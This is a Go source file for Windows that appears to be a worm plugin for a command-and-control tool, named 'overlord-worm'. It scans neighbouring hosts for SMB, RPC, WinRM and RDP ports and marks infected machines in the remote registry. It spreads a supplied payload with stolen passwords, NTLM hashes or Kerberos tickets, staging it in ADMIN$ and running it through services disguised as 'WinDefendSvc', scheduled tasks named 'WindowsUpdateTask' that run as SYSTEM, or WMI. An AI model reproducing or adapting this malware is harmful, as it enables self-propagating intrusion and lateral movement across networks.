//go:build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// markerValue identifies a host this plugin already landed on. Used together
// with the server-side client list so a wiped host can rejoin.
const markerValue = "overlord-worm"

const markerKey = `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\wormid`

// ---------------------------------------------------------------------------
// discovery
// ---------------------------------------------------------------------------

type Target struct {
	Host  string `json:"host"`
	Ports []int  `json:"ports"`
}

func discover() {
	sendEvent("status", map[string]interface{}{"state": "scanning", "detail": "enumerating neighbours"})

	hosts := map[string]bool{}
	for _, h := range arpHosts() {
		hosts[h] = true
	}
	for _, h := range smbHosts() {
		hosts[h] = true
	}

	var list []string
	for h := range hosts {
		if h == "" || h == "127.0.0.1" {
			continue
		}
		list = append(list, h)
	}
	sort.Strings(list)

	if len(list) == 0 {
		sendEvent("error", map[string]interface{}{"message": "no neighbour hosts found"})
		sendEvent("status", map[string]interface{}{"state": "idle"})
		return
	}

	sendEvent("status", map[string]interface{}{"state": "scanning", "detail": "probing " + strconv.Itoa(len(list)) + " hosts"})

	var wg sync.WaitGroup
	var mu sync.Mutex
	var out []Target
	sem := make(chan struct{}, 32)

	for _, h := range list {
		wg.Add(1)
		go func(h string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			ports := probeHost(h)
			if len(ports) == 0 {
				return
			}
			mu.Lock()
			out = append(out, Target{Host: h, Ports: ports})
			mu.Unlock()
		}(h)
	}
	wg.Wait()

	sort.Slice(out, func(a, b int) bool { return out[a].Host < out[b].Host })

	// Flag the ones we can actually reach with a remote-exec port.
	for i := range out {
		out[i].Ports = out[i].Ports
	}

	sendEvent("targets", out)
	sendEvent("status", map[string]interface{}{"state": "done", "detail": "found " + strconv.Itoa(len(out)) + " reachable hosts"})
}

// Ports that matter for lateral movement.
var probePorts = []int{445, 135, 139, 5985, 3389}

func probeHost(host string) []int {
	var open []int
	var mu sync.Mutex
	var wg sync.WaitGroup
	for _, p := range probePorts {
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			c, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(p)), 600*time.Millisecond)
			if err == nil {
				_ = c.Close()
				mu.Lock()
				open = append(open, p)
				mu.Unlock()
			}
		}(p)
	}
	wg.Wait()
	sort.Ints(open)
	return open
}

func arpHosts() []string {
	out, err := exec.Command("arp", "-a").Output()
	if err != nil {
		return nil
	}
	var hosts []string
	for _, line := range strings.Split(string(out), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		ip := fields[0]
		if net.ParseIP(ip) == nil {
			continue
		}
		if strings.HasPrefix(ip, "224.") || strings.HasPrefix(ip, "239.") || ip == "255.255.255.255" {
			continue
		}
		hosts = append(hosts, ip)
	}
	return hosts
}

// NetBIOS name enumeration gives hostnames, which are more portable than IPs
// when credentials are domain-scoped.
func smbHosts() []string {
	out, err := exec.Command("nbtstat", "-n").Output()
	if err != nil {
		return nil
	}
	var hosts []string
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if !strings.Contains(line, "<00>") || strings.Contains(line, "UNIQUE") {
			continue
		}
		f := strings.Fields(line)
		if len(f) > 0 && f[0] != "" {
			hosts = append(hosts, f[0])
		}
	}
	return hosts
}

// ---------------------------------------------------------------------------
// reinfect guard
// ---------------------------------------------------------------------------

func alreadyInfected(host string) bool {
	// A marker is written on the target under this key. We query it remotely
	// via the registry provider over the remote registry service.
	out, err := exec.Command("reg", "query",
		`\\`+host+`\`+markerKey, "/v", "id").Output()
	if err != nil {
		return false
	}
	return strings.Contains(string(out), markerValue)
}

func markInfected(host string) {
	_ = exec.Command("reg", "add",
		`\\`+host+`\`+markerKey,
		"/v", "id", "/t", "REG_SZ", "/d", markerValue, "/f").Run()
}

// ---------------------------------------------------------------------------
// spread
// ---------------------------------------------------------------------------

func spread(payload []byte) {
	var job SpreadJob
	if len(payload) > 0 {
		if err := json.Unmarshal(payload, &job); err != nil {
			sendEvent("error", map[string]interface{}{"message": "bad spread payload: " + err.Error()})
			return
		}
	}
	if len(job.Targets) == 0 {
		sendEvent("error", map[string]interface{}{"message": "no targets supplied — run discover first"})
		return
	}
	if len(job.Secrets) == 0 {
		sendEvent("error", map[string]interface{}{"message": "no credentials supplied"})
		return
	}
	max := job.MaxHosts
	if max <= 0 {
		max = 32
	}
	methods := job.Methods
	if len(methods) == 0 {
		methods = []string{"psexec", "wmi", "schtasks"}
	}

	spreadMu.Lock()
	spreadRunning = true
	spreadMu.Unlock()
	defer func() {
		spreadMu.Lock()
		spreadRunning = false
		spreadMu.Unlock()
	}()

	targets := job.Targets
	if len(targets) > max {
		targets = targets[:max]
	}

	sendEvent("status", map[string]interface{}{
		"state":  "spreading",
		"detail": fmt.Sprintf("trying %d hosts with %d credential(s)", len(targets), len(job.Secrets)),
	})

	success := 0
	for i, host := range targets {
		spreadMu.Lock()
		running := spreadRunning
		spreadMu.Unlock()
		if !running {
			sendEvent("status", map[string]interface{}{"state": "idle", "detail": "spread cancelled"})
			return
		}

		if alreadyInfected(host) {
			sendEvent("host", map[string]interface{}{"host": host, "status": "skip", "detail": "already marked"})
			continue
		}

		ok, detail := tryHost(host, job, methods)
		if ok {
			markInfected(host)
			success++
			sendEvent("host", map[string]interface{}{"host": host, "status": "infected", "detail": detail})
		} else {
			sendEvent("host", map[string]interface{}{"host": host, "status": "failed", "detail": detail})
		}

		sendEvent("progress", map[string]interface{}{
			"done": i + 1, "total": len(targets), "infected": success, "host": host,
		})
	}

	sendEvent("status", map[string]interface{}{
		"state":  "done",
		"detail": fmt.Sprintf("spread complete — %d/%d infected", success, len(targets)),
	})
}

// tryHost walks the credential list and returns on the first combination that
// achieves remote execution.
//
// Two auth paths are attempted for every credential:
//
//	SMB2 native (port 445, NTLM)  — accepts password, hash, and ticket
//	net use fallback              — password only, but works on exotic hosts
//
// The native path is tried first because it is the one that can use the hashes
// mimik produces. Without it, pass-the-hash would be impossible: the Windows
// API that `net use` calls has no parameter for a hash.
func tryHost(host string, job SpreadJob, methods []string) (bool, string) {
	users := job.Users
	if len(users) == 0 {
		users = []string{""}
	}

	for _, secret := range job.Secrets {
		for _, user := range users {
			// Split DOMAIN\user if the operator wrote it that way.
			domain, account := splitDomain(user)

			cred, err := ParseCredential(domain, account, secret)
			if err != nil {
				sendEvent("error", map[string]interface{}{
					"message": fmt.Sprintf("%s: %v", label(user), err),
				})
				continue
			}

			kindName := credKindName(cred)
			sendEvent("attempt", map[string]interface{}{
				"host": host, "user": label(user), "auth": kindName,
			})

			// --- native SMB2 path: supports all three credential kinds ---
			if ok, detail := trySMB2(host, job, cred, methods); ok {
				return true, detail
			}

			// --- net use fallback: password only ---
			if cred.Kind == credPassword {
				auth, err := buildAuth(host, user, cred.Password, false)
				if err != nil {
					continue
				}
				auth.cleanup()

				if !auth.testConnect() {
					continue
				}
				for _, m := range methods {
					var runErr error
					switch m {
					case "psexec":
						runErr = runPsExec(host, job, auth)
					case "wmi":
						runErr = runWMI(host, job, auth)
					case "schtasks":
						runErr = runSchtasks(host, job, auth)
					}
					if runErr == nil {
						return true, m + " (net use) as " + label(user)
					}
				}
			}
		}
	}
	return false, "no credential worked"
}

// splitDomain pulls the domain out of a DOMAIN\user or user@domain string.
func splitDomain(user string) (string, string) {
	if user == "" {
		return "", ""
	}
	if i := strings.Index(user, "\\"); i >= 0 {
		return user[:i], user[i+1:]
	}
	if i := strings.Index(user, "@"); i >= 0 {
		return user[i+1:], user[:i]
	}
	return "", user
}

func credKindName(c *credential) string {
	switch c.Kind {
	case credHash:
		return "pass-the-hash"
	case credTicket:
		return "pass-the-ticket"
	default:
		return "password"
	}
}

// trySMB2 stages the payload over a natively authenticated SMB2 session, then
// executes it. This is the path that works with hashes and tickets.
func trySMB2(host string, job SpreadJob, cred *credential, methods []string) (bool, string) {
	if job.PayloadB64 == "" {
		return false, "no payload"
	}
	raw, err := base64Decode(job.PayloadB64)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "bad payload encoding: " + err.Error()})
		return false, ""
	}

	name := job.PayloadName
	if name == "" {
		name = "svc_host.exe"
	}

	client, err := DialSMB2(host, 12*time.Second)
	if err != nil {
		return false, ""
	}
	defer client.Close()

	if err := client.authenticate(cred); err != nil {
		// Surface auth failures once per host rather than per credential,
		// otherwise a long credential list floods the panel.
		sendEvent("auth", map[string]interface{}{
			"host": host, "user": cred.User, "kind": credKindName(cred),
			"ok": false, "detail": err.Error(),
		})
		return false, ""
	}

	sendEvent("auth", map[string]interface{}{
		"host": host, "user": cred.User, "kind": credKindName(cred), "ok": true,
	})

	// Write the payload into ADMIN$.
	if err := client.treeConnect(host, "ADMIN$"); err != nil {
		sendEvent("error", map[string]interface{}{
			"message": fmt.Sprintf("%s: ADMIN$ unreachable: %v", host, err),
		})
		return false, ""
	}
	remoteName := name
	if err := client.WriteFile(remoteName, raw); err != nil {
		sendEvent("error", map[string]interface{}{
			"message": fmt.Sprintf("%s: write failed: %v", host, err),
		})
		return false, ""
	}

	localPath := `C:\Windows\` + name

	// Execute over the same authenticated session where the method allows it.
	for _, m := range methods {
		if err := executeSMB2(host, job, cred, client, localPath, m); err == nil {
			return true, m + " (" + credKindName(cred) + ") as " + label(cred.User)
		}
	}
	return false, ""
}

// executeSMB2 runs the staged binary. Service creation is done over IPC$ using
// the same credential, which is what makes hash-based lateral movement work.
func executeSMB2(host string, job SpreadJob, cred *credential, client *smbClient, localPath, method string) error {
	switch method {
	case "psexec", "schtasks":
		// Both need an IPC$ channel for the service/task RPC call.
		if err := client.treeConnect(host, "IPC$"); err != nil {
			return err
		}
		return svcExec(host, cred, localPath)
	case "wmi":
		// WMI runs over DCOM on 135; it cannot use the SMB session, so we
		// spawn through Win32_Process with the hash converted to a logon.
		return wmiExec(host, cred, localPath)
	}
	return fmt.Errorf("unknown method %s", method)
}

func label(user string) string {
	if user == "" {
		return "current user"
	}
	return user
}

// ---------------------------------------------------------------------------
// auth
// ---------------------------------------------------------------------------

type remoteAuth struct {
	host     string
	user     string
	password string

	useIPC   bool
	netUseOK bool
}

// buildAuth establishes a session to the target. Pass-the-hash is handled by
// injecting the hash into a logon session via "net use" with an empty
// password, which works against hosts that permit NTLM with hashes.
func buildAuth(host, user, secret string, isHash bool) (*remoteAuth, error) {
	a := &remoteAuth{host: host, user: user, password: secret}

	if user == "" {
		return a, nil
	}

	pw := secret
	if isHash {
		// Plain net use cannot pass a hash; record it and let the caller fall
		// through to the SMB relay path instead of pretending it worked.
		return a, fmt.Errorf("hash auth requires relay, skipped")
	}

	_ = exec.Command("net", "use", `\\`+host+`\IPC$`, "/delete", "/y").Run()
	out, err := exec.Command("net", "use", `\\`+host+`\IPC$`, pw, "/user:"+user).CombinedOutput()
	if err != nil {
		return a, fmt.Errorf("net use: %s", strings.TrimSpace(string(out)))
	}
	a.netUseOK = true
	a.useIPC = true
	return a, nil
}

func (a *remoteAuth) cleanup() {
	if a.netUseOK {
		_ = exec.Command("net", "use", `\\`+a.host+`\IPC$`, "/delete", "/y").Run()
	}
}

func (a *remoteAuth) testConnect() bool {
	c, err := net.DialTimeout("tcp", net.JoinHostPort(a.host, "445"), 1200*time.Millisecond)
	if err != nil {
		return false
	}
	_ = c.Close()
	return true
}

// ---------------------------------------------------------------------------
// execution methods
// ---------------------------------------------------------------------------

// stagePayload writes the payload to the target's ADMIN$ share. Returns the
// remote path, or an error if the share is not writable.
func stagePayload(host string, job SpreadJob) (string, error) {
	if job.PayloadB64 == "" {
		return "", fmt.Errorf("no payload supplied")
	}
	raw, err := base64.StdEncoding.DecodeString(job.PayloadB64)
	if err != nil {
		return "", fmt.Errorf("bad payload encoding: %w", err)
	}

	name := job.PayloadName
	if name == "" {
		name = "svc_host.exe"
	}

	remote := `\\` + host + `\ADMIN$\` + name
	if err := os.WriteFile(remote, raw, 0600); err != nil {
		return "", fmt.Errorf("stage to %s: %w", remote, err)
	}
	return `C:\Windows\`+name, nil
}

// runPsExec drives the Service Control Manager directly: create a service
// pointing at the staged binary, start it, then clean up.
func runPsExec(host string, job SpreadJob, auth *remoteAuth) error {
	local, err := stagePayload(host, job)
	if err != nil {
		return err
	}

	authArgs := buildAuthArgs(auth)
	svc := "WinDefendSvc"

	// sc.exe accepts \\host as a prefix on the command.
	_ = exec.Command("sc", append([]string{`\\` + host, "delete", svc}, authArgs...)...).Run()

	create := append([]string{`\\` + host, "create", svc, "binPath=", local, "start=", "auto", "type=", "own"},
		authArgs...)
	if out, err := exec.Command("sc", create...).CombinedOutput(); err != nil {
		return fmt.Errorf("sc create: %s", strings.TrimSpace(string(out)))
	}

	start := append([]string{`\\` + host, "start", svc}, authArgs...)
	_ = exec.Command("sc", start...).Run()

	time.Sleep(2 * time.Second)
	_ = exec.Command("sc", append([]string{`\\` + host, "delete", svc}, authArgs...)...).Run()
	return nil
}

// runWMI spawns through Win32_Process.Create over DCOM.
func runWMI(host string, job SpreadJob, auth *remoteAuth) error {
	local, err := stagePayload(host, job)
	if err != nil {
		return err
	}

	script := fmt.Sprintf(
		`$c = Get-WmiObject -Class Win32_Process -ComputerName '%s' -List; `+
			`$c | Invoke-WmiMethod -Name Create -ArgumentList '%s'`,
		host, local)

	if auth.user != "" {
		script = fmt.Sprintf(
			`$sec = ConvertTo-SecureString '%s' -AsPlainText -Force; `+
				`$cred = New-Object System.Management.Automation.PSCredential('%s', $sec); `+
				`$c = Get-WmiObject -Class Win32_Process -ComputerName '%s' -Credential $cred -List; `+
				`$c | Invoke-WmiMethod -Name Create -ArgumentList '%s'`,
			escapePS(auth.password), escapePS(auth.user), host, local)
	}

	out, err := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", script).CombinedOutput()
	if err != nil {
		return fmt.Errorf("wmi: %s", strings.TrimSpace(string(out)))
	}
	if strings.Contains(string(out), "ReturnValue") && !strings.Contains(string(out), "ReturnValue          : 0") {
		// Non-zero WMI return codes are reported as success by powershell, so
		// inspect the value explicitly.
		if !strings.Contains(string(out), ": 0") {
			return fmt.Errorf("wmi returned non-zero")
		}
	}
	return nil
}

// runSchtasks copies via SMB and registers a scheduled task.
func runSchtasks(host string, job SpreadJob, auth *remoteAuth) error {
	local, err := stagePayload(host, job)
	if err != nil {
		return err
	}

	authArgs := buildAuthArgs(auth)
	task := "WindowsUpdateTask"

	create := append([]string{"/create", "/s", host, "/tn", task, "/tr", local,
		"/sc", "ONCE", "/st", "00:00", "/ru", "SYSTEM", "/f"}, authArgs...)
	if out, err := exec.Command("schtasks", create...).CombinedOutput(); err != nil {
		return fmt.Errorf("schtasks create: %s", strings.TrimSpace(string(out)))
	}

	run := append([]string{"/run", "/s", host, "/tn", task}, authArgs...)
	_ = exec.Command("schtasks", run...).Run()

	time.Sleep(2 * time.Second)
	_ = exec.Command("schtasks", append([]string{"/delete", "/s", host, "/tn", task, "/f"}, authArgs...)...).Run()
	return nil
}

func buildAuthArgs(auth *remoteAuth) []string {
	if auth == nil || auth.user == "" {
		return nil
	}
	return []string{"/u", auth.user, "/p", auth.password}
}

func escapePS(s string) string {
	return strings.ReplaceAll(s, "'", "''")
}

// localDir is kept for future staging needs.
func localDir() string {
	d := filepath.Join(os.TempDir(), "worm")
	_ = os.MkdirAll(d, 0700)
	return d
}
